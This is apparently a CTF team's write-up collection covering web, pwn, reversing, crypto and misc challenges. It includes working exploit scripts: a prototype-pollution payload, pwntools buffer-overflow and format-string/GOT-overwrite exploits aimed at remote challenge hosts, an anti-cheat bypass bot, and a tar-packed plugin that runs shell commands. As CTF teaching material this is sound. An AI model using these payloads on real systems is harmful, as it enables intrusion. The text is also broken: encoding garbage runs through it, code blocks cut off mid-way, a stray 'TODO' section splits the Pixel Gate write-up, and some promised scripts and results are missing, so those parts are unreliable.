#### Analysis

The challenge exposes a minimal dashboard that supports third‚Äëparty plugins. When we upload a plugin, the platform also lets us download any existing ones (including the official `flag.plugin`).

#### Exploit

After downloading `flag.plugin`, we notice it‚Äôs encrypted. `The server.py` file contains both the key and the function to decrypt it, so we can locally decrypt it using `decrypt_file`.
```python
KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"

def decrypt_file(input_path, output_path, key):
    with open(input_path, "rb") as f:
        data = f.read()
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    with open(output_path, "wb") as f:
        f.write(plaintext)
```

The decrypted `flag.plugin` `init.py` contains the following code:
```python
import json, sqlite3, pathlib, time, uuid
import os
plugin_dir = pathlib.Path(__file__).resolve().parent
manifest_path = plugin_dir / "plugin_manifest.json"
name, version = "Widget", "1.0.0"
if manifest_path.exists():
    try:
        m = json.loads(manifest_path.read_text())
        name = m.get("name", name)
        version = m.get("version", version)
    except Exception:
        pass


thumb = thumb = f'''<svg xmlns="http://www.w3.org/2000/svg" width="320" height="180">
<rect x="0" y="0" width="320" height="180" fill="#eef"/>
<text x="50%" y="50" dominant-baseline="middle" text-anchor="middle"
      font-size="48" font-family="sans-serif">üö©</text>
<text x="50%" y="110" dominant-baseline="middle" text-anchor="middle"
      font-size="16" font-family="sans-serif" fill="#444">v{version}</text>
</svg>'''
(plugin_dir / "thumbnail.svg").write_text(thumb)

flag = os.getenv("FLAG","You ran this locally and did not set a dummy flag, dummy.")
print("You cannot see this MUHAHAHAHA:" + flag)
```

In short, `init.py` prints the flag to stdout when executed. The server executes a plugin‚Äôs `init.py` during upload (`/upload`). Our idea is to leverage this behavior from another plugin:

- First, we need to discover the server‚Äëside UID of the `flag` widget so we know its directory name.
- Then, we have to craft a malicious plugin whose `init.py` uses a relative path traversal (`../{uid}/init.py`) to execute the flag plugin‚Äôs `init.py` via `subprocess` and capture stdout.
- Finally, write that stdout into `index.html`, which the platform renders back to us.

For the exploit to work reliably, use the folder structure below.

### Random Gallery

#### Challenge Recap

Random Gallery is a web challenge based on a simple authentication flaw.  
When you visit the site, you‚Äôre greeted by a login page, but there‚Äôs no option to register‚Äîso logging in seems impossible.

By inspecting the browser cookies, you‚Äôll spot a `logged_in` cookie set to `false`.  
If you manually change this value to `true` and go to the index page (`/`), you gain access to the site.

Once inside, explore a bit and you‚Äôll come across a QR code:

<img src="/images/randomgallery.png" alt="QR code" width="250"/>

Scan the QR code to get the flag

### Theme-Generator

Theme-Generator is a web app that allows users to upload and merge JSON presets for customizing themes. The application includes protections against prototype pollution and restricts certain sensitive actions to admin users only.

Prototype pollution is a subtle and dangerous vulnerability that affects JavaScript applications. It occurs when an attacker is able to inject properties into JavaScript‚Äôs global object prototype (`Object.prototype`). Since all objects inherit from this prototype, polluting it can have far-reaching consequences,potentially allowing an attacker to escalate privileges or alter application behavior in unexpected ways.

In this challenge, the developers tried to defend against prototype pollution by blocking any top-level keys named `__proto__`, `prototype`, or `constructor` in incoming JSON data:

```javascript
for (const k of Object.keys(data)) {
    if (["__proto__", "prototype", "constructor"].includes(k)) {
        return res.status(400).send('blocked');
    }
}
```

At first glance, this seems like a reasonable defense. However, the check only inspects the top-level keys of the submitted JSON object. If an attacker nests a malicious key deeper inside the object, the filter is bypassed. For example, sending the following payload:

```json
{ "user": { "__proto__": { "isAdmin": true } } }
```

will sneak the `__proto__` property into the object prototype, setting `isAdmin` to `true` for all objects. This effectively grants admin privileges to the attacker.

With admin access, it‚Äôs then possible to make a request to the `/admin/flag` endpoint and retrieve the flag. This challenge highlights the importance of deep validation when dealing with user-supplied objects in JavaScript, especially when merging

### Sigdance

#### Code Analysis

The challenge consists of two C files: `main.c` and `plugin.c`.

##### `main.c`

This file contains the main logic of the program. Its key actions are:
- It sets up signal handlers for `SIGALRM` and `SIGUSR1`.
- It uses `setitimer` to generate `SIGALRM` signals at a regular interval (every 7ms).
- It creates a new thread that repeatedly sends `SIGUSR1` signals to the main process (every 5ms).
- It calls `nanosleep` for 777 milliseconds.
- It dynamically loads a shared library `libcore.so` and calls a function `verify` from it.
- The program reads user input and passes it to the `verify` function. If `verify` returns true, the flag is printed.

##### `plugin.c`

This file is compiled into `libcore.so` and contains the `verify` function.
```c
#include <stdint.h>

int verify(uint32_t provided, uint32_t ac, uint32_t uc, uint32_t pid) {
  uint32_t token = ((ac << 16) ^ (uc << 8) ^ (pid & 255u));
  return provided == token;
}
```
The `verify` function calculates a `token` based on three values:
- `ac`: The count of `SIGALRM` signals received.
- `uc`: The count of `SIGUSR1` signals received.
- `pid`: The lower 8 bits of the process ID.

To solve the challenge, we need to predict the values of `ac` and `uc` and provide the correct token.

#### The Vulnerability

The core vulnerability lies in the interaction between the `nanosleep` function and the signals.

The `main` function calls `nanosleep` for 777ms. However, it does not check the return value of `nanosleep`. According to the `nanosleep` man page, if the sleep is interrupted by a signal, it returns `-1` and sets `errno` to `EINTR`.

In this program, two different signals are being generated concurrently:
1.  `SIGALRM` is scheduled to fire every 7ms.
2.  The separate thread sends `SIGUSR1` every 5ms.

Since the `SIGUSR1` signal arrives first (after 5ms), it interrupts the `nanosleep` call. The program execution continues immediately without sleeping for the full duration.

Crucially, the line that disables the `SIGALRM` timer is *after* the `nanosleep` call:
```c
setitimer(ITIMER_REAL, &(struct itimerval){0}, NULL);
```
Because `nanosleep` is interrupted before the first `SIGALRM` (7ms) has a chance to fire, the timer is disabled, and the `SIGALRM` handler is never called.

The program then waits for the `SIGUSR1`-sending thread to complete its loop, which sends a total of 13 signals.

This means the final counts will always be:
- `ac = 0`
- `uc = 13`

#### The Solution

With the predictable values of `ac` and `uc`, we can create a simple program to calculate the required token.

**`solver.c`**
```c
// gcc -o solver solver.c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    fprintf(stderr, "Usage: %s <pid8>\n", argv[0]);
    return 1;
  }

  uint32_t pid8 = strtoul(argv[1], NULL, 0);
  uint32_t ac = 0;
  uint32_t uc = 13;

  uint32_t token = ((ac << 16) ^ (uc << 8) ^ pid8);

  printf("%u\n", token);

  return 0;
}
```

**`solve.py`**
```python
from pwn import *
import subprocess

r = remote("ctf.ac.upt.ro", 9749)

r.recvuntil(b'= ')
pid = int(r.recvline().strip())
log.info(f"PID: {pid}")

res = subprocess.run(['./solver', str(pid)], check=True, capture_output=True).stdout.decode()

r.sendline(res)
print(r.recvall().decode())
```

### baby-bof

**baby-bof** is a beginner-friendly pwn challenge that introduces one of the most classic vulnerabilities: **Buffer Overflow**.

#### Challenge Overview

The decompiled code (e.g., from IDA) reveals that the executable reads `0x100` bytes into a buffer that is only 64 bytes in size:

![Decompiled code showing buffer overflow](/images/babybof.png)

This allows us to write past the end of the buffer and overwrite the *stack*, including the return address. By doing so, we can redirect execution to any function we want‚Äîin this case, the `win()` function.  
This technique is commonly called **ret2win**.  
For more details, see [this guide](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win).

#### Exploit

Here‚Äôs the exploit script:

```python
from pwn import *

elf = context.binary = ELF('./challenge')
context.terminal = []

if args.REMOTE:
    p = remote('ctf.ac.upt.ro', 9806)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b rww
        c
    ''')
else:
    p = elf.process()

# 64 bytes buffer + 8 bytes saved RBP = 72 bytes to reach return address
payload = b'A' * 72 + p64(elf.symbols.win)
p.sendlineafter(b':\n', payload)
p.interactive()
```

**Explanation:**
- The payload overflows the buffer and overwrites the return address with the address of `win()`.
- The script works locally, with GDB, or remotely.

### fini

**fini** is the first challenging pwn task in this series. Here, we need to exploit a more advanced vulnerability known as a **format string bug**.

#### Finding the Vulnerability

The vulnerability is easy to spot if you are familiar with format string bugs.  
In the decompiled code (see image below), the program calls `printf()` **without** specifying a format string, like `%s`:

![Decompiled code showing vulnerable printf](image-1.png)

This means user input is passed directly to `printf`, allowing us to control the format string and leak stack values or write to arbitrary memory.

Additionally, the program provides a feature that lets us write any value to any address‚Äîthis will be useful for exploitation.

#### Exploiting the Vulnerability

Since `printf` is called without a format string, we can send our own format specifiers. For example, sending `%p` will print a stack address.  
If we send a payload like `%p.%p.%p.%p.%p.%p.%p.%p.`, the program will print out several stack addresses in order, separated by dots.  
This helps us see the stack layout and find which offset corresponds to interesting values (like the return address or function pointers).  
You can increase the number of `%p` specifiers to print more stack values, or use GDB to inspect the stack and count how many `%p` are needed to reach a specific value.

By experimenting, we discover that `%50$p` leaks the address of `main`.  
This allows us to calculate the base address of the binary, even if PIE (Position Independent Executable) is enabled.

Next, we use the program's write-anywhere feature to overwrite the **GOT entry** for `printf` with the address of the `win()` function.  
This way, when `printf` is called again, it will actually call `win()` and give us the flag.

#### Exploit Script

```python
from pwn import *

elf = context.binary = ELF('./challenge')
context.terminal = []

if args.REMOTE:
    p = remote('ctf.ac.upt.ro', 9777)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b main
        c
    ''')
else:
    p = elf.process()

# Leak the address of main using the format string vulnerability
p.sendlineafter(b'?\n', b'%50$p')
p.recvuntil(b', ')
main = int(p.recvline().strip(), 16)
print(f'Main address: {hex(main)}')

# Calculate the PIE base address
elf.address = main - elf.symbols.main
print(f'Base address: {hex(elf.address)}')

# Use the program's feature to overwrite printf@GOT with win()
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', hex(elf.got.printf).encode())
p.sendlineafter(b': ', hex(elf.symbols.win).encode())

# Get the flag!
p.interactive()
```

#### Summary

- The vulnerability is a classic format string bug due to an unsafe `printf` call.
- We leak the address of `main` to defeat PIE.
- We overwrite `printf`'s GOT entry with the address of `win()`.
- When the program calls `printf` again, it jumps to `win()` and gives us the flag.

### Minecrafty

This challenge shipped a custom **Go-based Minecraft server** (modified `go-mc/server`) plus a "hint" file, **`message.txt`**, containing a Node.js bot that talks the Minecraft protocol. The objective was to trigger the server to print the flag in chat.

The core idea: the **`!flag`** chat command checks your **exact** XYZ and only returns the real flag if you‚Äôre standing at **(69420, 69420, 69420)**. Movement is rate-limited, but not enough to stop a bot from walking there in small hops.

#### What‚Äôs interesting in the server

**1. The chat command gate**

In `server/game/chat.go`, the server inspects incoming chat. When the message is `!flag`, it reads the player‚Äôs current `Position` and compares it to `(69420, 69420, 69420)`. If you‚Äôre not there, it taunts you with a decoy:

```go
switch string(message) {
case "!flag":
    x := int32(player.Position[0])
    y := int32(player.Position[1])
    z := int32(player.Position[2])

    if x != 69420 || y != 69420 || z != 69420 {
        c.SendPlayerChat(
            player.UUID, 0, signature,
            &sign.PackedMessageBody{
                PlainMsg: fmt.Sprintf(
                    "ctf{try_harder}  Your Position: %d %d %d  Expected Position: 69420 69420 69420",
                    x, y, z),
                Timestamp: timestamp, Salt: int64(salt),
                LastSeen: []sign.PackedSignature{},
            },
            nil, &sign.FilterMask{Type: 0}, &chatType,
        )
    } else {
        c.SendPlayerChat(
            player.UUID, 0, signature,
            &sign.PackedMessageBody{
                PlainMsg: "ctf{redacted}",
                Timestamp: timestamp, Salt: int64(salt),
                LastSeen: []sign.PackedSignature{},
            },
            nil, &sign.FilterMask{Type: 0}, &chatType,
        )
    }
```

**2. The anticheat threshold**

In `server/world/tick.go`, the server checks how far you moved between updates. If a single step is **over 100 blocks**, it teleports you back (classic "moved too quickly" behavior). Anything **‚â§ 100** is accepted:

```go
delta := [...]float64{
    inputs.Position[0] - p.Position[0],
    inputs.Position[1] - p.Position[1],
    inputs.Position[2] - p.Position[2],
}
distance := math.Sqrt(delta[0]*delta[0] + delta[1]*delta[1] + delta[2]*delta[2])
if distance > 100 {
    teleportID := c.SendPlayerPosition(p.Position, p.Rotation)
    p.teleport = &TeleportRequest{ ID: teleportID, Position: p.Position, Rotation: p.Rotation }
} else if inputs.Position.IsValid() {
    p.pos0 = inputs.Position
    p.rot0 = inputs.Rotation
    p.OnGround = inputs.OnGround
}
```

**3. Offline mode**

The included `server/config.toml` enables offline logins:

```toml
online-mode = false
enforce-secure-profile = false
listen-address = "0.0.0.0:25565"
```

That‚Äôs why a plain protocol bot can connect with `auth: 'offline'`.

#### Solution

Given the above, solving reduces to:

1. **Connect in offline mode** to the server.
2. **Walk** to `(69420, 69420, 69420)` using hops **‚â§ 100 blocks** per update so the server accepts our position.
3. **Send `!flag`** and capture any chat message containing `ctf{`.

The provided `message.txt` already gives a working Node exploit using **mineflayer** and **vec3** that does exactly this: it connects offline, steps toward the target with a per-step cap (conservative **50** ‚â§ 100), then sends `!flag` and prints any chat containing `ctf{`.&#x20;

Minimal usage (from the exploit header):

```bash
npm i mineflayer vec3
node exploit_flag.js --host <SERVER_IP> --port 25565 --name Flaggy
```

Key ideas in the bot:

* **Bounded steps** to bypass the >100 anti-cheat:

```js
const MAX_STEP = 50
function stepTowards(cur, dst, maxStep) {
  const dx = dst.x - cur.x, dy = dst.y - cur.y, dz = dst.z - cur.z
  const dist = Math.hypot(dx, dy, dz)
  if (dist === 0) return cur
  if (dist <= maxStep) return dst
  const s = maxStep / dist
  return new Vec3(cur.x + dx*s, cur.y + dy*s, cur.z + dz*s)
}
```

* **Raw position packets** every \~200 ms so the server updates your position without pathfinding.
* On arrival, **send `!flag`** and **grep chat** for `ctf{`.

Once positioned **exactly** at `(69420, 69420, 69420)`, the server‚Äôs `!flag` handler takes the `else` branch and replies with the real flag in chat.

```js
#!/usr/bin/env node
const mineflayer = require('mineflayer')
const { Vec3 } = require('vec3')

function parseArgs () {
  const args = { host: '127.0.0.1', port: 25565, name: 'Flaggy', version: '1.19.4' }
  for (let i = 2; i < process.argv.length; i++) {
    const a = process.argv[i]
    if (a === '--host') args.host = process.argv[++i]
    else if (a === '--port') args.port = parseInt(process.argv[++i], 10)
    else if (a === '--name') args.name = process.argv[++i]
    else if (a === '--version') args.version = process.argv[++i]
  }
  return args
}

const TARGET = new Vec3(69420, 69420, 69420)
const MAX_STEP = 50 // be conservative: strictly under server's >100 check

function stepTowards (cur, dst, maxStep) {
  const dx = dst.x - cur.x
  const dy = dst.y - cur.y
  const dz = dst.z - cur.z
  const dist = Math.sqrt(dx * dx + dy * dy + dz * dz)
  if (dist === 0) return cur
  if (dist <= maxStep) return new Vec3(dst.x, dst.y, dst.z)
  const s = maxStep / dist
  return new Vec3(cur.x + dx * s, cur.y + dy * s, cur.z + dz * s)
}

## Reverse engineering ‚öôÔ∏è

### Pythonese

This challenge gave a raw **Python bytecode dump** and asked us to recover the flag produced at runtime.

At first glance, the file imports a lot of modules (`hashlib`, `base64`, `marshal`, `asyncio`, etc.) and fills `__doc__`/`__annotations__` with random Base64 to create noise. There‚Äôs also an anti-RE check that looks for reverse-engineering modules and debuggers. We ignored those parts and focused on the control flow.

After mapping functions (`f0...f16`), we saw that the entrypoint (`f16`) reads an input string `i`, builds a small "VM" (via `compile` + `marshal`) that exposes a `run(...)` function, and then **prints the return value of `run(...)`**. The crucial piece is how that `run` is constructed in `f15`: it wraps a constant string `r` built by `f13`, so the printed flag is entirely determined by `f13`.

Inside `f13` we found two integers derived from the input:

* `k1 = int(i[:4])`
* `k2 = int(i[4:6])`

A nested helper (`fvdy`) then decodes several integer arrays (labeled conceptually as `a, b, c, d, e, f, g, h, i`) into characters using this per-element transformation:

```
ch = chr( (((v >> 1) + k2) ^ (k1 & 0xFF)) & 0xFF )
```

Once each array is decoded, `f13` assembles the final string `r` as:

1. the decoded `a` (used as a **prefix**),
2. the other parts reordered by a fixed permutation `P = (3, 6, 1, 7, 0, 5, 2, 4)`, and
3. a single-character **suffix**.

To solve it, we enforced the natural prefix `a == "CTF{"` and solved the resulting linear congruences (mod 256) across the first few characters of `a`. This pins down:

* `k1 ‚â° 81 (mod 256)` (any 4-digit `k1` that ends up `81` modulo 256 works, e.g., `1105`)
* `k2 = 83`

With `k1, k2` fixed, decoding and assembling `a + permuted_rest + suffix` yields the full flag string. Any input whose first 6 digits satisfy those constraints makes the program print the flag (e.g., `110583...` the remaining digits don‚Äôt matter).

### Pixel Gate

This challenge shipped with a stripped Go binary (`challenge`) and a helper script `gen.py`. The binary expects a very specifically crafted PNG file and prints its contents only if all internal validations succeed. By reversing the RISC-V64 Go build we found a deliberately narrow, hand-rolled PNG parser whose constraints are mirrored exactly by the generator script.

### Ironevil

TODO

#### The algorithm

The file must begin with the standard 8-byte PNG signature. Immediately following, an `IHDR` chunk is required whose 13-byte payload encodes width 1337, height 1, bit depth 8 and color type 2 (truecolor) while compression, filter and interlace bytes are all zero. (The code path tolerated color type 6 as an alternative, yet the provided script sticks to 2, keeping things simpler.) Every chunk undergoes a normal PNG CRC32 verification computed over the concatenation of its 4-byte type and data. After `IHDR`, the program expects a `tEXt` chunk whose data splits on the first NUL: a 15‚Äëbyte key followed by a 17‚Äëbyte value. These bytes are compared verbatim against embedded constants: key `6ee494848e978ea` and value `d50bc687e6e14f8f8`. A custom ancillary chunk named `raRE` must also appear, carrying an 18‚Äëbyte payload equal (as raw ASCII, not decoded) to `2b6b2c6ba2912d219d`. At least one `IDAT` chunk is required but its contents are never decompressed; an empty data field is accepted because only its presence and CRC are considered. Finally an `IEND` chunk must terminate the stream. Internally the parser maintains flags for signature validity, successful `IHDR`, matching text key/value, correct `raRE` payload, having seen one or more `IDAT` chunks, and encountering `IEND`. Only if all become true does the program reopen the file and dump its raw bytes to stdout.

#### Solution

Reconstructing a passing file therefore reduces to a linear assembly: emit the PNG signature, construct the exact `IHDR`, forge the `tEXt` bytes as key + NUL + value, append the fixed `raRE` payload, include an empty `IDAT`, and close with `IEND`, ensuring each chunk‚Äôs crc32(type||data) matches the stored checksum. The order used by the helper‚ÄîIHDR ‚Üí tEXt ‚Üí raRE ‚Üí IDAT ‚Üí IEND‚Äîsatisfies all dependencies and keeps the image minimal.

The helper `gen.py` automates these steps and writes `pass.png`:

##### Python PNG generator

```py
import struct, zlib

def chunk(typ: str, data: bytes = b"") -> bytes:
    typb = typ.encode("ascii")
    crc = zlib.crc32(typb + data) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + typb + data + struct.pack(">I", crc)

def build_png() -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", 1337, 1, 8, 2, 0, 0, 0)
    text_key = b"6ee494848e978ea"
    text_val = b"d50bc687e6e14f8f8"
    text_data = text_key + b"\x00" + text_val
    rare_data = b"2b6b2c6ba2912d219d"
    idat_data = b""  # empty accepted
    return b"".join([
        sig,
        chunk("IHDR", ihdr),
        chunk("tEXt", text_data),
        chunk("raRE", rare_data),
        chunk("IDAT", idat_data),
        chunk("IEND", b""),
    ])

if __name__ == "__main__":
    data = build_png()
    with open("pass.png", "wb") as f:
        f.write(data)
    print(f"Wrote pass.png ({len(data)} bytes)")
```

#### Final notes

The strings that resemble hexadecimal are never interpreted‚Äîcomparison occurs over their literal ASCII bytes. Allowing color type 6 would not add value here, so color type 2 keeps palette and alpha concerns away. Because no decompression takes place, an empty `IDAT` suffices. Any deviation‚Äîincorrect length, altered constant, missing chunk, or CRC mismatch‚Äîcauses an early abort before output. The result is a deliberately tiny, deterministic PNG acting as a gate token.


## Cryptography üîë

### Repeated RSA 

#### Challenge Recap

We're given three RSA moduli (`n1`, `n2`, `n3`), all using the same exponent `e = 65537`. The ciphertext is the result of encrypting the message three times in a row, each time with a different modulus:

```
c = (((m^e mod n1)^e mod n2)^e mod n3)
```

At first glance, this seems secure, but if the moduli share factors, it's game over.

#### Solution Outline

The trick is to compute `gcd(n1, n2)`, `gcd(n1, n3)`, and `gcd(n2, n3)`. If any two moduli share a prime, we can factor all three. Once factored, we build the private keys and decrypt in reverse order: first with `n3`, then `n2`, then `n1`.

#### Flag

After running the script below, we get:

### SSS

This challenge ships three big hex blobs named `P1`, `P2`, and `P3`:

* `P1="8010ba0d6ed3..."`
* `P2="80264e325aa0..."`
* `P3="8036f43f3473..."`

The description ("Shamir will be proud") screams **Shamir‚Äôs Secret Sharing (SSS)**. With three attachments and no other parameters given, the most natural setup is a **3-of-3** scheme over GF($2^8$) (the byte field) where we‚Äôre meant to reconstruct the secret.

#### What the attachments are

Each `P*` is a **hex-encoded share**. Before doing any math it helps to peek at basic structure:

* All three start with `0x80` followed by one varying byte (`0x10`, `0x26`, `0x36` respectively).
* After those first **2 bytes**, the remaining bytes in each blob have the **same length**.

That strongly suggests a tiny **2-byte header/metadata** (common in homegrown or library share formats, e.g., a tag/version and/or index), followed by the **actual share payload** (the y-values of a Shamir point). We don‚Äôt need the metadata to reconstruct the secret, so we can safely drop those two bytes from each blob and work on the aligned bodies.

#### The key idea

Shamir‚Äôs reconstruction at $x=0$ uses Lagrange interpolation. If the three shares are at $x\in\{1,2,3\}$ (a very common choice), then in **characteristic 2** fields (like GF(2‚Å∏)), the Lagrange coefficients at $x=0$ come out to **1, 1, 1**:

$$
\lambda_1=\frac{(0-2)(0-3)}{(1-2)(1-3)}=\frac{(2)(3)}{(3)(2)}=1,\quad
\lambda_2=\frac{(0-1)(0-3)}{(2-1)(2-3)}=\frac{(1)(3)}{(1)(3)}=1,\quad
\lambda_3=\frac{(0-1)(0-2)}{(3-1)(3-2)}=\frac{(1)(2)}{(2)(1)}=1.
$$

In characteristic 2, addition is XOR. So the secret at $x=0$ is simply the **bytewise XOR** of the three share payloads:

$$
\text{secret} = y_1 \oplus y_2 \oplus y_3.
$$

(If you‚Äôre skeptical about the sample points, the quickest sanity check is to try XOR anyway-if it yields something legible, you‚Äôre done. It does. üôÇ)

#### Recovering the secret

1. **Parse hex**, **drop the first 2 bytes** (header) from each share.
2. **XOR** the three bodies byte-for-byte.
3. Inspect the result:

   * The bytes pattern looks like `00 63 00 74 00 66 ...` which is **UTF-16BE**.
   * Reading from the **end** you‚Äôll spot `00 7B 00 66 00 74 00 63` -> `{ftc`, i.e. the text is **reversed**.
4. Decode as **UTF-16BE**, then **reverse the string**.

##### Minimal reproduction

flag = s.decode('utf-16-be')[::-1].rstrip('\x00\x01')
print(flag)
```


#### Solution

By XORing the three share bodies and decoding the result as **UTF-16BE**, then reversing the string, we get:

```
ctf{d6b72529c6177d8f648ae85f624a24d6f1edce5ca29bd7cc0b888e117a123892}
```

That‚Äôs the whole trick: treat the first two bytes as metadata, use the Shamir hint to try XOR (valid for $x\in\{1,2,3\}$ over GF($2^8$)), and recognize the reversed UTF-16BE output.

### XORbitant

This challenge provides two attachments, a Python script and a binary dump.
The challenge essentially consists of decrypting a ciphertext encrypted with the XOR between a very large plaintext and the flag.

This encryption operation is performed by the following code:

```python
import os

def xor(input_path: str, output_path: str):
    key = os.getenv("FLAG","CTF{example_flag}") 

    key_bytes = key.encode("utf-8")
    key_len = len(key_bytes)

    with open(input_path, "rb") as infile, open(output_path, "wb") as outfile:
        chunk_size = 4096
        i = 0
        while chunk := infile.read(chunk_size):
            xored = bytes([b ^ key_bytes[(i + j) % key_len] for j, b in enumerate(chunk)])
            outfile.write(xored)
            i += len(chunk)

xor("plaintext.txt","out.bin")
```

This code is potentially vulnerable to frequency attacks but also to many-time-pad attacks (since the flag is reused on blocks of 69 characters, `ctf{sha256sum}`).
In our case, we preferred to reconstruct the flag using the CLI tool `mtp` and, as we progressively uncovered parts of the text, we revealed the flag character by character.

To do this, it was enough to simply divide the ciphertext into 69-byte chunks, encode them in hexadecimal, and write them line by line into a txt file to then feed them to the aforementioned tool.

Once this was done we could guess the first 4 bytes since we knew the flag started with `ctf{`.

## Miscellaneous üêß

### Octojail

#### Overview

A Python service reads a string of octal digits (triplets), converts them to bytes, treats the result as a tar archive, extracts it into `uploads/` (with basic path checks), then imports `plugin.py` and calls `run()` if present. The service enforces a 6-second timeout, requires octal-only input of length multiple of 3, and limits input size.

#### Key Observation

* The service executes `plugin.run()` from an extracted `plugin.py` ‚Äî **arbitrary code execution** via a supplied tar archive.


#### Exploitation Strategy

1. Create a `plugin.py` that performs the desired action (e.g., `ls` or read `flag.txt`).
2. Pack `plugin.py` into a tar archive.
3. Convert the tar bytes to an octal-triplet string.
4. Provide that octal string to the service's.
5. The service extracts the archive and runs `plugin.run()`, executing your code.

**Read a flag file:**

```py
# plugin.py
import os

def run():
    os.system("cat flag.txt")
```

```bash
tar cf plugin.tar plugin.py
```

Convert the tar bytes to octal-triplets (Python):

```py
# tar_to_octal.py
with open("plugin.tar", "rb") as f:
    data = f.read()

octal = ''.join(f"{b:03o}" for b in data)
print(octal)
```

This prints the octal string to paste into the target program's prompt.

#### Conclusion
After we sent our script as an octal string and the server execute it we will get the flag

### onions1

**onions1** is a simple but fun misc challenge that introduces you to the world of .onion (Tor hidden) services.

The task: just visit the following .onion URL using the Tor Browser:

```
2ujjzkrfk4ls4r6vbvvkpn5nyouimcw5hjarezbznvsowfjzup7otdad.onion
```

Once you fire up Tor and head to the link, you‚Äôre greeted with the following page:

![Screenshot of the .onion page](/images/onions1.png)

That‚Äôs it! Sometimes the challenge is just about knowing the right tool‚Äîin this case, Tor Browser.  
If you‚Äôve never used it before, this is a great excuse to try it out and see how .onion sites work.

### Escaping Barcellona

In this challenge, the goal was to determine the distance between Mars and Barcellona at a specific date and time. The problem allowed a tolerance of ¬±0.009 million kilometers, which proved to be quite generous. This margin, combined with some luck probably, made it possible to bypass the need for Barcellona‚Äôs exact coordinates and instead focus on the Earth-Mars distance as a whole.

To solve this, I used the Astropy library, which provides precise astronomical calculations. By leveraging the JPL ephemeris, I ensured the positions of the planets were as accurate as possible for the given date and time. The script calculates the barycentric positions of both Mars and Earth, then computes the Euclidean distance between them. This approach sidesteps the need for a specific location on Earth, since the difference at this scale is negligible within the allowed tolerance.

Here‚Äôs the script I used:

```python
from astropy.coordinates import EarthLocation, get_body_barycentric, solar_system_ephemeris
from astropy.time import Time
import astropy.units as u

obs_time = Time("2025-11-07 16:00:00")

solar_system_ephemeris.set('jpl')

mars_pos = get_body_barycentric('mars', obs_time)

earth_pos = get_body_barycentric('earth', obs_time)

distance = (mars_pos - earth_pos).norm()
distance_km = distance.to(u.km)

print(f"Distance from Earth to Mars at {obs_time.iso} UTC: {distance_km:.3f}")
```

### Onions2

Onions2 was a tougher and more intriguing misc challenge centered around .onion (Tor hidden) sites.

We kicked things off by uploading the image provided by the challenge to [Aperisolve](https://www.aperisolve.com/). Hidden within the image data, we discovered a .onion URL. 

Curious, we fired up Tor and visited the site. At first glance, the page looked empty, there was nothing obvious to interact with. After poking around for a while, we stumbled upon a font file hosted on the site. Inside this font file, we found another hidden string. 

We ran this mysterious string through CyberChef, which revealed a new clue:
![alt text](/images/cyberchef-onions2.png)

CyberChef decoded the string into a Google Maps link:  
https://www.google.com/maps/place/ARChA/@45.7450165,21.225122,17z/data=!4m16!1m9!3m8!1s0x47455d9b87725af1:0x7a82191592d97493!2sARChA!8m2!3d45.7450165!4d21.2277023!9m1!1b1!16s/g/11vbtv2ys4!3m5!1s0x47455d9b87725af1:0x7a82191592d97493!8m2!3d45.7450165!4d21.2277023!16s/g/11vbtv2ys4?entry=ttu&g_ep=EgoyMDI1MDkxMC4wIKXMDSoASAFQAw==

This link led us to the ARChA building at the University of Timi»ôoara. There, we uncovered the final piece of the puzzle:

Overall, Onions2 was a great mix of digital forensics, hidden services, and creative problem-solving.

### Disco Dance

This challenge provided two attached services, one in Python and one in TypeScript, with the goal of encrypting the flag using a random seed.

The interesting part, however, is in the Python code, since the TypeScript service (besides not being vulnerable) only had the task of proxying HTTP requests from the Python server to Discord, while adding a private Discord bot token.

In the Python server, two functions can be noted:

* The `get_random` function, which reads 5 messages from the channel with id `1416908413375479891`.

```python
def get_random() -> bytes:
    url = f"https://proxy-gamma-steel-32.vercel.app/api/proxy/channels/1416908413375479891/messages?limit=5"
    headers = {
        "Authorization": f"Bot {os.getenv('TOKEN')}",
    }


    response = requests.get(url, headers=headers)
    response.raise_for_status()

    messages = response.json()

    concatenated = "".join(msg["content"] for msg in messages).encode("utf-8")
    return concatenated
```

* And the `encrypt` function, whose purpose is to encrypt the flag using the messages obtained from `get_random` as the key for **AES CBC**, after hashing them with SHA256.

```python
def encrypt(data: bytes, key: bytes) -> str:
    digest = SHA256.new()
    digest.update(key)
    aes_key = digest.digest()

    iv = get_random_bytes(16)

    padded_data = pad(data, AES.block_size)

    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(padded_data)

    return base64.b64encode(iv + ciphertext).decode()
```

#### Solution

To solve this challenge, we reasoned that in order to obtain the key it was necessary to have access to the Discord channel and, while exploring the CTF server, we noticed the `spam` channel where participants occasionally sent exactly 5 messages.

We then confirmed that the ID matched, and we simply contacted the service to have it encrypt the flag with a key we generated ourselves.

### Disco Rave

To fully understand this writeup, it is recommended to first read the writeup for `Disco Dance`, since the general reasoning has already been explained there.

The only changed behavior here is in the `get_random` function. In this challenge, it reads the latest 10 messages from the channels `1416908413375479891` (**spam**) and `1417154025371209852` (**spam\_plus\_plus**), then returns a single string containing the timestamps and messages, ordered first from `spam` and then from `spam_plus_plus`, to be used as the AES key.

```python
def get_random() -> bytes:
    channels = [
        "1416908413375479891",
        "1417154025371209852",
    ]
    headers = {
        "Authorization": f"Bot {os.getenv('TOKEN')}",
    }

    all_data = []

    for channel_id in channels:
        url = f"https://proxy-gamma-steel-32.vercel.app/api/proxy/channels/{channel_id}/messages?limit=10"
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        messages = response.json()

        for msg in messages:
            content = msg.get("content", "")
            timestamp = msg.get("timestamp", "")
            all_data.append(f"{content}{timestamp}")

    concatenated = "".join(all_data).encode("utf-8")
    return concatenated
```

#### Solution

By following the same procedure as in `Disco Dance`, it is possible to obtain the flag by decrypting it with the AES key derived from our own Discord messages.

## Forensics ü§ñ

### Unknown Traffic 1

